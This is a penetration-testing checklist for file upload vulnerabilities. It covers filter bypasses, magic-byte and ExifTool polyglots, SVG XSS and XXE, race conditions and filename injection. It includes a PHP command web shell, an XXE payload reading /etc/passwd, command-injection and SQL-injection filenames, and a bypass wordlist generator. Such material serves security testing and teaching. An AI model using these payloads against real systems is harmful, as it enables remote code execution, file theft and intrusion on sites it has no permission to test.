# File Upload Vulnerability — Testing Checklist

---

## 0. Recon / Setup

- [ ] Intercept the upload request in Burp — inspect raw `multipart/form-data` body (boundary, `Content-Disposition`, `filename`, `Content-Type`).
- [ ] Determine if validation is client-side (JS) or server-side — disable JS / replay in Repeater to confirm.
- [ ] Fingerprint backend language/framework (fuzz `index.*`, `whatweb`, `Wappalyzer`) so the shell payload matches the stack (PHP/ASP/JSP/etc).
- [ ] Check response behavior on upload (errors, paths, filenames returned) — note anything that leaks server info.

---

## 1. No-Filter / Baseline Test

- [ ] Try uploading a raw shell with no obfuscation first — confirm there's no filter at all.
- [ ] If Content-Type header is trusted blindly, just edit it in Repeater to match what's expected while keeping the malicious body.
- [ ] After upload, trigger the file directly (`GET /path/shell.php?cmd=id`).
- [ ] If trigger returns blank/error instead of executing:
  - [ ] Suspect "no-execute" upload directory — try path traversal in the `filename` field (`../../var/www/html/shell.php`) to relocate to an executable dir.
  - [ ] Fuzz for accepted extensions using SecLists / PayloadAllTheThings extension lists; grep responses for an echoed test string.

---

## 2. Blacklist Filter Bypass

- [ ] Identify if filter is blacklist-based (blocks specific extensions only).
- [ ] Try lesser-known executable extensions: `.php5`, `.phtml`, `.shtml`, `.pht`, `.phar`.
- [ ] Test non-recursive stripping bug: `shell.p.phphp` → may resolve to `shell.php` after single-pass strip.
- [ ] Try uploading a malicious server config file to remap an allowed extension to executable:
  - [ ] Apache: `.htaccess` with `AddType application/x-httpd-php .jpg`
  - [ ] IIS: `web.config` with a malicious `<mimeMap>` entry
  - [ ] Upload config file to the **same directory** as the payload, then upload payload with the now-allowed extension.
- [ ] Extension obfuscation tricks:
  - [ ] Case manipulation — `shell.pHp`
  - [ ] Multiple/double extensions — `shell.php.jpg`
  - [ ] Trailing characters — `shell.php.`, `shell.php ` (trailing dot/space)
  - [ ] URL encoding — `shell%2Ephp`
  - [ ] Null byte / semicolon — `shell.php%00.jpg`, `shell.asp;.jpg` (PHP <5.x for null byte)
  - [ ] Multibyte Unicode that normalizes to `.` — `\xC0\x2E`

---

## 3. Whitelist Filter Bypass

- [ ] Fuzz to confirm exact accepted extension list and observe response differences (hints at validation logic).
- [ ] Double extension: `shell.jpg.php` (if check only looks for substring/contains allowed ext anywhere).
- [ ] Reverse double extension: `shell.php.jpg` (some servers execute by first recognized extension).
- [ ] Character injection before/after extension — generate permutations and fuzz:
  - `%20` `%0a` `%00` `%0d0a` `/` `.\` `.` `…` `:`
  - Test as prefix and suffix of both the malicious and allowed extension.
- [ ] Windows-specific: colon injection — `shell.aspx:.jpg` (IIS may write as `shell.aspx`).
- [ ] After any successful bypass, **verify the actual stored filename** by trying to access it under different name variants — null byte truncation means the `.jpg` suffix is gone from what's stored.

---

## 4. Type / Content Validation Bypass

### 4.1 Content-Type header
- [ ] Fuzz `Content-Type` header using SecLists `web-all-content-types.txt` (filtered to relevant category, e.g. `image/*`).

### 4.2 MIME-type / Magic Bytes
- [ ] Check if server validates intrinsic file properties (e.g. parseable image dimensions) — a script will fail this.
- [ ] Check if server validates via magic bytes / file signature (first few bytes).
- [ ] Prepend correct magic bytes to payload to spoof detected MIME type (e.g. `GIF87a`/`GIF89a`, `FF D8 FF` for JPEG).
- [ ] **Polyglot bypass**: embed PHP payload inside valid image metadata via ExifTool:
  ```
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o polyglot.php
  ```
- [ ] Mix-and-match fuzzing across layers — different validation layers may disagree:
  - [ ] allowed MIME + disallowed Content-Type
  - [ ] allowed MIME/Content-Type + disallowed extension
  - [ ] disallowed MIME/Content-Type + allowed extension

---

## 5. No-RCE-Path Exploitation (Limited Uploads)

Use when execution is blocked but the upload is still exploitable.

### 5.1 XSS
- [ ] Test HTML file upload for stored XSS (only works if served same-origin as the app).
- [ ] Metadata-based XSS — inject payload into EXIF fields rendered by the app (`Comment`, `Artist`):
  ```
  exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' image.jpg
  ```
- [ ] Test if changing MIME-Type to `text/html` causes the file to render as HTML instead of an image.
- [ ] SVG-based XSS — embed `<script>` tag inside SVG XML and check if it fires on display.

### 5.2 XXE
- [ ] SVG XXE — embed external entity to read local files (`/etc/passwd`, app source).
- [ ] PHP source disclosure via `php://filter/convert.base64-encode` in the SVG entity.
- [ ] Office documents (.docx/.xlsx/.pptx are ZIP+XML) — unzip, inject XXE into an internal XML file, rezip, upload.
- [ ] If response doesn't reflect file content (blind XXE):
  - [ ] OOB confirmation via Burp Collaborator (DNS/HTTP callback).
  - [ ] OOB data exfiltration via parameter entity chaining to leak file contents to your listener.

### 5.3 DoS
- [ ] Decompression bombs (nested ZIPs).
- [ ] Pixel flood — manipulate image dimension metadata to oversized values.
- [ ] Oversized file upload — check if size limits are enforced at all.
- [ ] Directory traversal in filename to write to sensitive system paths.
- [ ] XXE entity expansion (billion laughs).

---

## 6. Other Upload Attack Vectors

- [ ] **Race conditions**:
  - [ ] Check if upload flow looks custom (not framework-standard) — write-then-validate-then-delete pattern.
  - [ ] Group upload (POST) + trigger (GET) requests in Burp, send in parallel (single-packet/last-byte sync).
  - [ ] Use a payload that produces visible output (`file_get_contents`) rather than an interactive shell.
  - [ ] Try Turbo Intruder if stock Burp timing isn't tight enough.
  - [ ] **URL-based upload (import-by-URL) variant**: if filename uses `uniqid()` or similar predictable scheme, capture server time reference (`Date` header), narrow candidate filenames, and race a GET against the predicted name window.
  - [ ] Pad the hosted payload file with junk to widen the download/validation race window.

- [ ] **PUT-based upload**: send `OPTIONS` to endpoints to check for `PUT` support as an alternate upload path outside the normal UI.

- [ ] **Filename injection** (when filename is reflected/processed elsewhere):
  - [ ] Command injection: `file$(whoami).jpg`, `` file`whoami`.jpg ``
  - [ ] XSS: `<script>alert(window.origin)</script>.jpg` reflected in UI
  - [ ] SQLi: `file';select+sleep(5);--.jpg`

- [ ] **Upload directory disclosure**:
  - [ ] Directory/path fuzzing.
  - [ ] Chain LFI/XXE to read source and find storage paths.
  - [ ] IDOR-style probing of file storage patterns.
  - [ ] Force errors via duplicate filenames, concurrent identical uploads, or very long filenames (5000+ chars) to leak absolute paths.

- [ ] **Windows-specific**:
  - [ ] Reserved characters (`| < > * ?`) in filename to trigger errors.
  - [ ] Reserved names (`CON`, `COM1`, `LPT1`, `NUL`).
  - [ ] 8.3 short filename abuse (`HAC~1.TXT`) for disclosure or overwrite.

- [ ] **Backend processing pipeline abuse**: check if uploaded files go through video transcoding, compression, image processing, or other automated handling — these processing libraries can carry their own bugs (e.g. ffmpeg AVI XXE). Needs case-by-case research.

- [ ] **Disabled functions**: if common exec functions are blocked, try alternates: `exec`, `shell_exec`, `passthru`, `popen`, `proc_open`. Consider a shell that auto-tries multiple functions (e.g. p0wny-shell).

## Quick Reference: Payloads

```
# Basic shells
<?php system($_GET['cmd']); ?>
<?php echo file_get_contents('/path/to/file'); ?>

# Polyglot (image + PHP)
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o polyglot.php

# SVG XSS
<script>alert(window.origin);</script>

# SVG XXE (local file read)
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>

# Char-injection wordlist generator
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
    for ext in '.php' '.phps'; do
        echo "shell$char$ext.jpg" >> wordlist.txt
        echo "shell$ext$char.jpg" >> wordlist.txt
        echo "shell.jpg$char$ext" >> wordlist.txt
        echo "shell.jpg$ext$char" >> wordlist.txt
    done
done
```

**Tools**: Burp Repeater/Intruder, Turbo Intruder, ExifTool, whatweb/Wappalyzer, SecLists, PayloadAllTheThings, msfvenom, pentestmonkey reverse shells, p0wny-shell.
